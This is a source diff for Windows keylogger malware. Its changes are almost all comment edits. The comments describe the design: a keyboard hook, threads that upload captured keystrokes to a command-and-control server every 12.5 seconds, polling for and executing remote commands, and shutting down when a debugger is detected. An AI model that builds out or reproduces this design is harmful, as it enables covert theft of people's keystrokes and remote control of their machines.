@@ -43,6 +43,8 @@ RET_CODE setup() {
  *   - The KEY_LOGGER strucutre 
  *   - Creates the keyboard hook
  *   - Creates the threading Mutex
+ * 
+ * @return the address to new program context struct
  */
 static PROGRAM_CONTEXT* initProgramContext() {
     PROGRAM_CONTEXT* prCon = malloc(sizeof(PROGRAM_CONTEXT));
@@ -92,8 +94,10 @@ static PROGRAM_CONTEXT* initProgramContext() {
 // ----------------------
 
 /**
+ * initialise the workd threads for the malware. These are the threads
+ * to continuosly poll commands and write captured logs to the C2. 
  * 
- * @return 
+ * @return wehther or not the threads eecuted cleanly
  */
 RET_CODE startThreads() {
     // create the worker threads
@@ -119,11 +123,11 @@ RET_CODE startThreads() {
 
 /**
  * Function that executes infinitely until shd command is given. 
- * Every 20 seconds it attempts to write the captured keys to the 
- * server logs, if th write fails then it tries two more times.
- * Then resets the kLogger
+ * Every 12.5 seconds it attempts to write the captured keys to the 
+ * server logs, if the write fails then it tries two more times.
+ * Then resets the key logger
  * 
- * Important note: if the key buffer is empty, then don't 
+ * NOTE: if the key buffer is empty, then don't 
  * do anything to limit network activity.
  */
 DWORD WINAPI writeLogThread(LPVOID lpParam) {
@@ -152,8 +156,10 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
 }
 
 /**
- * function that executes infinitely until `shd` command is given. 
+ * Function that executes infinitely until `shd` command is given. 
  * Each iteration it retrieves the remote commands and then executes them!
+ * If we a debugger is detected then terminate immediately, if the 
+ * shutdown command is recieved then gradefully close
  */
 DWORD WINAPI pollCmdsAndBeaconThread(LPVOID lpParam) {
     while (!ctx->shutdown) {
@@ -248,12 +254,18 @@ static void doShutdown() {
 // --- Cleanup ---
 // ---------------
 
+/**
+ * simply calls the program context cleanup method passing the 
+ * global variable `ctx` as the argument
+ */
 void programCleanup() {
     programContextCleanup(ctx);
 }
 
 /**
  * cleanup function to close each of the handles and free allocated memory
+ * 
+ * @param prCon the program context structure to be cleaned up
  */
 void programContextCleanup(PROGRAM_CONTEXT* prCon) {
     if (prCon == NULL) return;
